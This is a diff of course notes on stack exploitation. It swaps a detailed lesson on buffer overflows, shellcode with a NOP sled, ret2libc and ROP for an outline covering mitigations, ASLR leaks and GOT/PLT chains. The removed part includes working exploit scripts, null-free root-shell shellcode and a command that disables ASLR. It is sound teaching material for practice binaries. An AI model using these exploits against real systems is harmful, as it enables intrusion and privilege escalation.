@@ -1,653 +1,115 @@
-3. Exploitation
-    * Overwriting Local Variables
-    * Overwriting the Return Address
-    * Shellcoding  + NOP sled (+ shellcode env var?)
-    * Return-to-libc
-    * Return-Oriented Programming
-
-==== Overwriting Local Variables  ====
-
-* Analyze local_corruption + explain solution
-
-Lets begin with a classical exercise in memory corruption. View the disassembly
-of the corruption program any way you like. The output from gdb is annotated
-below:
-
-# function prologue
-0x0804843b <+0>:     push   ebp
-0x0804843c <+1>:     mov    ebp,esp
-
-# making room on the stack for many variables and setting one to zero
-0x0804843e <+3>:     sub    esp,0x7c
-0x08048441 <+6>:     mov    DWORD PTR [ebp-0x4],0x0
-
-# printing a welcome message
-0x08048448 <+13>:    push   0x8048520
-0x0804844d <+18>:    call   0x8048300 <printf@plt>
-0x08048452 <+23>:    add    esp,0x4
-
-# gets(ebp-0x7c)
-0x08048455 <+26>:    lea    eax,[ebp-0x7c]
-0x08048458 <+29>:    push   eax
-0x08048459 <+30>:    call   0x8048310 <gets@plt>
-0x0804845e <+35>:    add    esp,0x4
-
-# comparing the variable from earlier to 0xbadf00d
-0x08048461 <+38>:    cmp    DWORD PTR [ebp-0x4],0xbadf00d
-0x08048468 <+45>:    jne    0x804847d <main+66>
-
-# print result if variable is 0xbadf00d
-0x0804846a <+47>:    lea    eax,[ebp-0x7c]
-0x0804846d <+50>:    push   eax
-0x0804846e <+51>:    push   0x8048537
-0x08048473 <+56>:    call   0x8048300 <printf@plt>
-0x08048478 <+61>:    add    esp,0x8
-0x0804847b <+64>:    jmp    0x8048491 <main+86>
-
-# print result if variable is not 0xbadf00d
-0x0804847d <+66>:    push   DWORD PTR [ebp-0x4]
-0x08048480 <+69>:    lea    eax,[ebp-0x7c]
-0x08048483 <+72>:    push   eax
-0x08048484 <+73>:    push   0x804854e
-0x08048489 <+78>:    call   0x8048300 <printf@plt>
-0x0804848e <+83>:    add    esp,0xc
-
-# return 0
-0x08048491 <+86>:    mov    eax,0x0
-0x08048496 <+91>:    leave
-0x08048497 <+92>:    ret
-
-You'll notice that the variable at ebp-0x84 is never mentioned in the assembly
-from the time it's set to zero to the time of the comparison at main+45. So how
-could the resulting jump possibly be avoided? The answer is in the only action
-that is taken after setting ebp-0xc to zero. The call to gets().
-
-* Explain unsafe writes
-
-Ostensibly, gets() is a simple function to read input from the user and store
-it somewhere in memory. However, it is an incredibly unsafe function due to the
-fact that it reads an arbitrary number of input characters and writes all of
-them, no matter how many, to the location it is given. Even if gets() reads far
-more characters than can actually fit into its input buffer, it will happily
-write past the end of it, overwriting any poor variables unlucky enough to be
-in its way. For this reason, glibc issues a warning just for using gets().
-However, even the safer ways to read input such as fgets and scanf can be
-dangerous if used incorrectly.
-
-How can we exploit the unsafety of gets() to solve this challenge? Consider the
-stack frame at the point where gets() is called. It will look like this:
-
-+-------------------------------------+
-|                 &buf                |---+
-+-------------------------------------+   |
-| buf[3]   buf[2]   buf[1]   buf[0]   |<--+
-+-------------------------------------+
-| buf[7]   buf[6]   buf[5]   buf[4]   |
-+-------------------------------------+
-|                 ....                |
-+-------------------------------------+
-| buf[119] buf[118] buf[117] buf[116] |
-+-------------------------------------+
-|                 num                 |
-+-------------------------------------+
-
-The indices are backwards due to the little-endian byte order of the machine.
-Say our input was "Amol Bhave". After gets() returns, the stack frame will look
-like this:
-
-+-------------------------------------+
-|                 &buf                |---+
-+-------------------------------------+   |
-|   l        o        m        A      |<--+
-+-------------------------------------+
-|   a        h        B        _      |
-+-------------------------------------+
-|   ?        0        e        v      |
-+-------------------------------------+
-|                 ....                |
-+-------------------------------------+
-|   ?        ?        ?        ?      |
-+-------------------------------------+
-|                 num                 |
-+-------------------------------------+
-
-In the diagram above, "_" designates a space, "0" designates the terminating
-null byte, and "?" designates an unknown character. Of course, the characters
-will be written in memory as their ascii values, so the stack will really look
-like this:
-
-+---------------------+
-|       &buf[0]       |---+
-+---------------------+   |
-| 0x6c 0x6f 0x6d 0x41 |<--+
-+---------------------+
-| 0x61 0x68 0x42 0x20 |
-+---------------------+
-| 0x?? 0x00 0x65 0x76 |
-+---------------------+
-|        ....         |
-+---------------------+
-| 0x?? 0x?? 0x?? 0x?? |
-+---------------------+
-| 0x00 0x00 0x00 0x00 |
-+---------------------+
-
-We can see that our input is nowhere near the variable. But what if we gave
-gets() even more characters, say 121 of them? If we gave a string of 121 "A"s
-as input, the stack frame after the call to gets() would look like this:
-
-+---------------------+
-|       &buf[0]       |---+
-+---------------------+   |
-| 0x41 0x41 0x41 0x41 |<--+
-+---------------------+
-| 0x41 0x41 0x41 0x41 |
-+---------------------+
-| 0x41 0x41 0x41 0x41 |
-+---------------------+
-|        ....         |
-+---------------------+
-| 0x41 0x41 0x41 0x41 |
-+---------------------+
-| 0x00 0x00 0x00 0x41 |
-+---------------------+
-
-* Go through partial overwrite in GDB
-
-Notice that we overwrote part of num! We can see this happen in real time with
-gdb + voltron, but first we have to create a file with our input string. Don't
-bother trying to count out 121 "A"s. Instead, use the following command to get
-python to do it for you:
-
-python -c "print 'A'*121" > input.txt
-
-This will create a file called input.txt with exactly 121 "A"s. Open corruption
-in gdb + voltron and initialize stack and disassembly views. Now when you want
-to run the program, use r < input.txt rather than just r. Step through until
-just before the call to gets(), and take note of the value of ebp+0xc. Then
-use ni to see how gets overwrites part of the variable. We also get the
-following message: "Sorry AAA...AAA, but a = 0x00000041". From here it's pretty
-clear how to win the challenge. Run the following command:
-
-python -c "print 'A'*120 + '\x0d\xf0\xad\x0b'" > input.txt
-
-Then run ./corruption < input.txt to complete the challenge. You can also see
-the result in gdb + voltron if you wish.
-
-==== Overwriting the Return Address ====
-
-* Explain overwriting the return address
-
-We've seen that we can exploit buffer overflows to overwrite local variables,
-but there is a much more dangerous area of memory we can target. Recall that in
-the cdecl calling convention, a newly called function will execute the
-following function prologue:
-
-push ebp
-mov ebp, esp
-
-It is presented with a stack of the following form:
-
-+---------------------+
-| saved frame pointer |<--- esp,ebp
-+---------------------+
-|   return address    |
-+---------------------+
-|        arg1         |
-+---------------------+
-|        ....         |
-+---------------------+
-|        argn         |
-+---------------------+
-| caller's local vars |
-+---------------------+
-|        ....         |
-+---------------------+
-
-After it finishes executing, the callee executes its function epilogue:
-
-mov esp, ebp <-+-(these two are abbreviated with the "leave" instruction)
-pop ebp      <-+
-ret
-
-After "mov esp, ebp" is executed, the stack is back to the same form
-illustrated above. ebp is then restored to its old value with "pop ebp", and
-eip is restored to the next instruction with "ret." Normally this process works
-well, but what happens when we overwrite the return address with, say, a buch
-of "A"s? Then at the end of execution, the callee will face a stack of the
-following form:
-
-+---------------------+
-| 0x41 0x41 0x41 0x41 |<--- esp,ebp
-+---------------------+
-| 0x41 0x41 0x41 0x41 |
-+---------------------+
-|        arg1         |
-+---------------------+
-|        ....         |
-+---------------------+
-|        argn         |
-+---------------------+
-| caller's local vars |
-+---------------------+
-|        ....         |
-+---------------------+
-
-When "pop ebp" is executed, the ebp is flies off to the middle of nowhere (or
-more precisely, 0x41414141). Then when "ret" is executed, eip flies off to the
-middle of nowhere with it! The program will then attempt to execute whatever
-data is written at 0x41414141 as an instruction, but since the memory there
-isn't marked as executable, the program will crash with a segfault. But if we
-instead overwrite eip with a targeted address, the program will start executing
-instructions there after the function returns! ebp will still go AWOL, so if
-the instructions at the targeted address depend on it, it won't execute
-properly. But this still gives us a way to execute any instructions located in
-the binary.
-
-Now we'll use this knowledge to redirect execution in the eip_overwrite
-program. This is the program's assembly:
-
-0x0804844e <+0>:     push   ebp
-0x0804844f <+1>:     mov    ebp,esp
-0x08048451 <+3>:     sub    esp,0x40
-0x08048454 <+6>:     lea    eax,[ebp-0x40]
-0x08048457 <+9>:     push   eax
-0x08048458 <+10>:    call   0x8048300 <gets@plt>
-0x0804845d <+15>:    add    esp,0x4
-0x08048460 <+18>:    mov    eax,0x0
-0x08048465 <+23>:    leave
-0x08048466 <+24>:    ret
-
-However, there is a function called executeme() hidden somewhere in the binary.
-Your goal is to get the program to call that function. To locate the function
-we can use either readelf or nm. We will then give the program a string of
-0x44 "A"s (or any other spacing character) followed by the address of
-executeme() as input. We can do this with following python script:
-
-#!/usr/bin/python
-import struct
-
-addr = struct.pack("<I", 0x0804843b)
-print "A" * 0x44 + addr
-
-# The same effect can be achieved with
-# print addr * 12
-
-Give the file execute privileges, then run ./<script>.py > ./eip_overwrite.
-
-Questions:
-The program still ends with a segfault. Can you tell why?
-If you change the last line of the script to "print 'A' * 0x44 + addr * n",
-    execute() is called n times. Can you tell why?
-
-==== Shellcoding ====
-
-* Explain shellcoding
-
-*Note* Make sure that environment variables are unset and aslr is turned off
-for this section
-"echo 0 | sudo tee /proc/sys/kernel/randomize_va_space"
-
-The technique above gives us much more control, but we are still limited to
-using instructions that exist in the original program. In our next exploit
-we're going to write our own code into memory and get the program to execute
-it. The idea is simple: we craft our input such that the insecure function not
-only writes our code into memory, but also overwrites the return address with
-the location of that code. That way, at the end of execution, the stack will
-look like this:
-
-             +---------------------+
-     buf --->|       machine       |<-------------+
-             |                     |              |
-             |        code         |              |
-             +---------------------+              |
-             |         buf         |              |
-             +---------------------+              |
-original sfp |         buf         |<--- esp,ebp  |
-             +---------------------+              |
-original ret |         buf         |--------------+
-             +---------------------+
-             |         buf         |
-             +---------------------+
-             |         ...         |
-             +---------------------+
-
-Then after "pop ebp; ret" is executed, eip will point to our code and the
-program will begin executing it, taking any action we want. And what better
-action to have the program take than executing a shell?
-
-There's only one problem with this idea: it requires us to know the exact
-address of the buffer where our code is written in advance. If we jump even one
-byte away from the correct start of the shellcode, the code won't execute. gdb
-can give us a good guess as to where it is, but memory addresses change a
-little when run under gdb, due to the fact that environment variables and
-program arguments are stored on the stack. To remedy this problem, we will
-augment our input with a nop sled.
-
-"nop sled" is a fancy way of referring to a bunch of nop (0x90) instructions
-included in the input. This is useful because if we jump to any location on the
-nop sled, the program will simply execute nop instructions (which do absolutely
-notthing) all the way down the sled until it reaches our machine code. This way
-we can get our code to execute even with only an estimate of where buf is
-located. So we really want to achieve a stack like this:
-
-             +---------------------+
-     buf --->|         nop         |
-             +---------------------+
-             |         ...         |<-------------+
-             +---------------------+              |
-             |         nop         |              |
-             +---------------------+              |
-             |       machine       |              |
-             |                     |              |
-             |        code         |              |
-             +---------------------+              |
-             |         buf         |              |
-             +---------------------+              |
-original sfp |         buf         |<--- esp,ebp  |
-             +---------------------+              |
-original ret |         buf         |--------------+
-             +---------------------+
-             |         ...         |
-             +---------------------+
-
-* The shellcode must have the "-p" argument and have no bad characters
-
-First we need the machine code to spawn a shell. Make a copy of your assembly
-program from yesterday that executed /bin/bash and look at its disassembly with
-objdump. We'll have to make a few changes before it's ready to be read directly
-as input.
-
-The first is that if /bin/bash is called without the "-p" flag to run in
-privileged mode, the effective uid (root) will be set to the real uid (you), so
-you won't get a root shell. So you'll have to change your code to call
-"/bin/bash -p" rather than just "/bin/bash".
-
-Second, in order for your code to be copied as a string, none of it's bytes
-can be space characters in ascii or the null byte used to denote the end of C
-strings. Bytes to look out for are 0x00 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x1A, and
-0x20. Here are a few ways to remove these characters from your code:
-
-1) Start your program with "xor eax, eax", and use "push eax" to push null
-values onto the stack
-
-2) Use "add al, 5; add al, 6" instead of "mov eax, 0x0B"
-
-3) If you have to push null values at the end of a string, replace the null
-   values with 0xff and replace them with 0x00 with "shl dword [esp], <shift>;
-   shr dword [esp], <shift>"
-
-3) Remove the call to _exit() entirely
-
-Solution:
-global _start
-
-section .text
-; execve("/bin/bash", ["/bin/bash", "-p", 0x0], [0x0]);
-_start:
-    xor eax, eax       ; set eax to 0x0
-
-    ; write "/bin/bash" to the stack
-    push 0x00000068    ;push "h000"
-    push 0x7361622f    ;push "/bas"
-    push 0x6e69622f    ;push "/bin"
-    mov ebx, esp       ;ebx points to "/bin/bash"
-
-    ; write "-p" to the stack
-    push 0xffff702d    ;push "-p00" (shift out high bytes)
-    shl dword [esp], 0x10
-    shr dword [esp], 0x10
-    mov ecx, esp       ;ecx points to "-p"
-
-    push eax           ;push null pointer
-    push ecx           ;push address of "-p"
-    push ebx           ;push address of "/bin/bash"
-    mov ecx, esp       ;ecx points to ["bin/bash", "-p", 0x0]
-
-    lea edx, [ecx+0x4] ;edx points to a null pointer
-
-    ; execve() is sycall 11
-    add al, 0x5
-    add al, 0x6
-    int 0x80
-
-Once your shellcode works without these characters, use the extract_shellcode
-script to get it in a python-friendly form. Save this somewhere for later, and
-use gdb to get the address of buf. You want to shoot for an address somewhere
-in the middle of you nop sled, so add about half of it's length to the address
-of buf. You'll have to write a python script something like this:
-
-#!/usr/bin/python
-import struct
-import sys
-
-if len(sys.argv) == 1:
-    offset = 0
-else:
-    offset = int(sys.argv[1])
-
-nop = '\x90'
-brk = '\xcc'
-
-nop_sled = nop * <nop sled length>
-
-# pad your shellcode with nops to stay word-aligned
-shellcode = <your shellcode here>
-
-addr = struct.pack("<I", <address of buf> + <half nop slep length> + <offset>)
-
-s = nop_sled + shellcode + addr * <a bunch>
-print s
-
-Then run "./input.py | ./shell_exploit". If you get a segfault or illegal
-instruction, try changing the offset. You can safely try intervals of half the
-length of the nop sled. You can also debug by adding 0xCC bytes to trigger a
-breakpoint. Once you find an offset that works without error, there's one last
-problem to fix: scanf() flushes stdin with an EOF, which causes /bin/bash to
-quit. You can get it to stay open by running "(./input.py <offset> ; cat) |
-./shell_exploit".
-
-*Note* If you make the nop sled too big, the shellcode will actually start
-overwriting itself as it executes!
-
-==== Return-to-libc ====
-
-Because buffer overflow vulnerabilities are so dangerous, prevention techniques
-were developed to prevent them. Data execution prevention (DEP) is one such
-technique. For such a fancy name, DEP is a remarkably simple defense
-mechanism: a program is just compiled with the non-executable (NX) bit set on
-the stack. This means that whenever the program attempts to execute
-instructions located in the stack segments, an exeception is thrown, and
-execution terminates.
-
-Although ret2libc_exploit and shell_exploit are incredibly similar, they differ
-in a few key respects. Run "readelf --segments" on each binary and check the
-flags on the GNU_STACK entry. What do you notice? Try using your previous
-exploit on ret2libc_exploit. You'll notice that it causes a segfault.
-
-Return-to-libc, or ret2libc for short, is a technique to bypass DEP. Rather
-than returning to code we control on the stack, we instead return to code that
-we *don't* control - anywhere else in the program. While this may seem to
-greatly diminish our control, it turns out in many cases to be just as
-dangerous as executing shellcode.
-
-When a C program wants to execute library functions, it must first load or
-"map" that library into memory. And even if only one function is desired, the
-entire library is mapped. That means there are thousands of necessarily
-executable instructions just lying around in memory. And even though we didn't
-write any of them ourselves, we can still use them to take control of a
-program. Take system() for example. system() simply executes the string it is
-given as an argument. It's also part of libc, which means it's included in any
-program that uses libc functions. And if we can call it with the right
-argument, say "/bin/sh", we can get a shell even if DEP is being used.
-
-We can get the address of system() easily enough using gdb, but we also have to
-call it with the proper argument. To do this, consider the stack frame after a
-normal call to system("/bin/sh"):
-
-
-+---------------------+
-|         ret         |
-+---------------------+
-|      "/bin/sh"      |
-+---------------------+
-|        ....         |
-+---------------------+
-
-First the calling function pushes the argument, "/bin/bash" in this case, and
-then the "call" instruction pushes the return address. So when system() is
-called, it expects the stack to have the state pictured above. We're going to
-build this kind of stack by hand in order to get the same behavior. Therefore
-our input will consist of 4 main parts:
-
-1) Padding to reach the return address
-2) The address of system()
-3) An address for system() to return to (optionally)
-4) A pointer to "/bin/sh"
-
-Since we only want to execute a single command the return address isn't a big
-deal, but getting the address of exit() is just as easy as getting the address
-of system(). But how do we get a pointer to "/bin/sh"? We could use an
-environment variable, since they're stored on the stack, but we would need an
-exact address. And why aren't we using "/bin/bash -p", anyway?
-
-The answer is that the string "/bin/sh" is also included in libc (for some
-reason). So this one library has everything we need to get a shell. To get the
-addresses, simply open ret2libc_exploit in gdb, place a breakpoint at the start
-of main(), and run the program. Then when it pauses, run "p system". You can
-also run "p exit" to exit cleanly and avoid getting a segfault (you'll get the
-shell either way).
-
-To get the address of "/bin/sh", we first have to find where glibc is mapped in
-memory. We can do this by running "info proc mappings" from gdb. This will list
-all of the program's mapped memory regions, including the ones for libc
-(/lib/i386-linux-gnu/libc-2.23.so). You can then run 'find <libc start
-address>, <libc end address>, "/bin/sh"' to get the address of that string.
-You now have everything you need to bypass DEP and get a shell. Try crafting an
-input (using python is recommended) to get a shell from ret2libc_exploit.
-
-Solution:
-#!/usr/bin/python
-import struct
-
-padding = "A" * <a bunch>
-system = struct.pack("<I", <address of system>)
-exit = struct.pack("<I", <address of exit>)
-bin_bash = struct.pack("<I", <address of "/bin/sh">)
-
-s = padding + system + exit + bin_bash
-print s
-
-Then run (./input.py ; cat) | ./ret2libc_exploit to get a (unfortunately
-unprivileged) shell.
-
-http://stackoverflow.com/questions/17775186/buffer-overflow-works-in-gdb-but-not-without-it/17775966#17775966
-https://dhavalkapil.com/blogs/Shellcode-Injection/
-http://www.commandlinefu.com/commands/view/12151/get-shellcode-of-the-binary-using-objdump
-https://gbmaster.wordpress.com/2014/07/01/x86-exploitation-101-born-in-a-shell/
-https://burrows.svbtle.com/bash-privileged-mode-quirk
-
-==== Return-Oriented Programming ====
-
-The last attack gave us a powerful tool to bypass DEP, but we were only able to
-obtain a regular shell. This could still be disastrous if, for example, the
-program were running as a remote service. But how can we use it to get a root
-shell if we already have access to the machine?
-
-Calling system("/bin/sh -p") won't work, but there is another way to prevent
-bash from dropping privileges. If we call setuid(0) prior to making the call to
-system("/bin/sh"), bash won't drop privileges and we'll be dropped into a root
-shell. Maybe we can adapt the prvious technique to make three function calls.
-Let's diagram how the stack should look. Remember: when a function is called,
-it expects it's return address on the top of the stack, followed by its
-arguments.
-
-For the call to setuid():  For the call to system():  For the call to exit():
-
-+---------------------+    +---------------------+    +---------------------+
-|       padding       |    |       padding       |    |       padding       |
-+---------------------+    +---------------------+    +---------------------+
-|      &setuid()      |    |   "doesn't matter"  |    |   "doesn't matter"  |
-+---------------------+    +---------------------+    +---------------------+
-|         ret         |    |      &system()      |    |   "doesn't matter"  |
-+---------------------+    +---------------------+    +---------------------+
-|     0x00000000      |    |         ret         |    |       &exit()       |
-+---------------------+    +---------------------+    +---------------------+
-|   "doesn't matter"  |    |     "/bin/bash"     |    |         ret         |
-+---------------------+    +---------------------+    +---------------------+
-|   "doesn't matter"  |    |   "doesn't matter"  |    |     0x00000000      |
-+---------------------+    +---------------------+    +---------------------+
-
-Unfortuately, there is a problem. setuid() needs its arugment (0x0) to be in
-the same location where system() and exit() needs the location of exit(). We
-could throw out the call to exit(), but what if system() weren't linked and we
-had to call more functions?
-
-This could be solved if instead of returning to the next function, we could
-return to a subroutine that would clean up the stack. For example:
-
-+---------------------+
-|       padding       |
-+---------------------+
-|      &setuid()      |
-+---------------------+
-|  &clean_up_routine  |
-+---------------------+
-|     0x00000000      |
-+---------------------+
-|      &system()      |
-+---------------------+
-|  &clean_up_routine  |
-+---------------------+
-|     "/bin/bash"     |
-+---------------------+
-|       &exit()       |
-+---------------------+
-|   "doesn't matter"  |
-+---------------------+
-|     0x00000000      |
-+---------------------+
-
-If we knew a reliable way to jump to such a subroutine, an input like the one
-above would work. We can't include it in our input and jump to it, since the
-whole point of this was to bypass DEP, but we CAN jump to other locations in
-memory, most notably those that pop values off the stack and then return. Look
-through the output of "objdump -d ./rop_exploit" and search for occurrences of
-"ret". You'll notice that one of them is preceded by "pop ebx", which means it
-does exactly what we need. It doesn't matter that the value is moved into a
-register, we just need the old "frame" cleared from the stack. This gives us a
-way to chain arbitrarily many function calls together, by concatenating frames
-of the form:
-
-+---------------------+
-|       &func()       |
-+---------------------+
-| pop-pop-...-pop-ret |
-+---------------------+
-|        arg1         |
-+---------------------+
-|        arg2         |
-+---------------------+
-|        ....         |
-+---------------------+
-|        argn         |
-+---------------------+
-
-Which means we can call setuid(0), system("/bin/bash"), and exit(0) in series,
-cleanly obtaining a root shell. But what if we wanted to do things other than
-call functions? Or wanted to do something that doesn't have a convenient libc
-wrapper? It's still possible, but it becomes more complicated. Rather than only
-returning to functions and pop-ret subroutines, we can in principle return to
-any executable section in the program preceded by a ret instruction to execute
-the code there. These bits of code preceded by ret instructions are called
-gadgets. By chaining gadget locations together, we can execute all kinds of
-instructions.
-
-It gets even worse for the poor program. Even though we can only execute
-instructions contained in the binary, there are always more instructions than
-intended since we can jump to any offset within the binary. There is a tool
-called ROPgadget which was made to find gadgets. Use it with "ROPgadget
---binary ./rop_exploit". You can also add a "--depth <num>" parameter to search
-for even more gadgets.
-
-https://github.com/JonathanSalwan/ROPgadget
+3. DEP, ROP, and ret2libc
+    * mitigations
+    * dep, ret2libc
+    * aslr, rop given leak
+    * got/plt, rop without leak
+
+==== Mitigations ====
+There are several mitigations in place to prevent the type of exploit we saw
+yesterday. The big three, all of which are enabled by default:
+
+* DEP/NX/W^X
+Data Execution Prevention / Non-eXecutable stack / Write xor eXecute - all
+mapped memory is either writable or executable, but never both
+
+* ASLR
+Address Space Layout Randomization - stack, heap, and share library locations
+are randomized at runtime
+
+* Stack Canaries
+Places a random token in each stack frame separating local variables from the
+saved base pointer and return address
+
+And the runner-ups, which must be specified at compile-time:
+
+* (Full) RELRO
+RElocation Read-Only - makes the got read-only by resolving all shared library
+code when the program is first loaded; programs have partial RELRO by default,
+but it offers very little exploit protection
+
+* PIC/PIE - Position Independent Code/ Executables - an extension of ASLR which
+allows the location of program code to be randomized as well; PIC is for shared
+library code while PIE is for executables
+
+* Fortify Source
+Adds additional checks at compile and/or runtime, but may violate code
+conformity
+
+==== DEP and ROP ====
+Return-Oriented Programming (ROP) is an exploit technique to bypass DEP. Rather
+than inject shellcode into the program, we overwrite the return address with one
+or more addresses of snippets of code (gadgets) we want to execute. As long as
+each snippet ends with a ret instruction, each one will be executed.
+
+** ret2libc
+* view source, mention system()
+* mention DEP (checksec) and static linking (file)
+
+Our goal is to call system("/bin/sh") to spawn a shell. Both system() and
+"/bin/sh" are located in the binary, so we need to find their locations.
+We also find a "pop ret" gadget so that we can pass "/bin/sh" as the argument.
+
+* get "pop rdi; ret" address with ROPgadget
+* get "/bin/sh" address with strings -tx
+* get system() address with readelf --syms
+* let students spawn the shell
+
++----------------+
+|  pop rdi; ret  |
++----------------+
+|   "/bin/sh"    |
++----------------+
+|     system     |
++----------------+
+
+This particular ROP technique is called return-to-libc (ret2libc) since we spawn
+the shell by returning to a libc function.
+
+==== ASLR ====
+Although ASLR randomizes the locations of the stack, heap, and shared libraries,
+each section is still loaded contiguously. This means that if you can leak a
+single library address and you have a copy of the library, you can calculate the
+locations of everything else in the library.
+
+** use_leak
+* view source code, point out leak
+* show how to programmatically read the address with pwntools
+* find puts and system offsets with readelf (suffix @@GLIBC_2.2.5)
+* find "/bin/sh" offset with strings -tx
+* let students spawn the shell
+
+==== GOT and PLT ====
+The plt is a list of code stubs, one for each shared library function and one
+more to resolve them. Each stub for a shared library contains a jump into the
+got followed by a section to prepare and jump to the resolver.
+
+The got initially contains a bunch of pointers back into the plt, one for each
+shared library function. They point at the sections which prepare and jump to
+the resolver.
+
+The resolver locates, or resolves, a shared library based on its arguments
+(prepared by the plt), writes its location to the got, and calls the function.
+Therefore subsequent function calls will not go through the resolver.
+
+In order for this to work, the got must be writable. This makes it a prime
+candidate target for exploitation.
+
+** make_leak
+* view source code (file and checksec), ask for exploitation suggestions
+* explain the plan in detail:
+  1) read() puts() address from the got
+  2) return to main()
+  3) ret2libc as before
+* find puts@plt with objdump -d -j .plt (or pwndbg)
+* find puts@got with readelf --relocs (or pwndbg)
+* let students spawn the shell
+
++----------------+
+|  pop rdi; ret  |
++----------------+
+|    puts@got    |
++----------------+
+|    puts@plt    |
++----------------+
+|      main      |
++----------------+
